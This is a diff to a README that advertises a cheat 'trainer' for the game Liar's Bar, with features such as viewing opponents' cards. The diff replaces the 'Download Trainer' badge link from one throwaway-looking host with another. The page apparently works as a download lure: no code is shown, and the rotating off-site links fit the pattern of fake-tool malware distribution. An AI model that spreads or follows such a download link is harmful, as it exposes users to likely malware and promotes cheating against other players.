@@ -2,7 +2,7 @@
 
 A trainer is a tool that modifies game elements to provide players with additional functionalities. In Liar's Bar, trainers can offer features like viewing opponents' cards, customizing game settings, and more.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload5.bitbucket.io/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Liars-Bar-Trainer-tus.github.io/.github)
 ---
 
 ## 🚀 **Top Features of Liar's Bar Trainers**
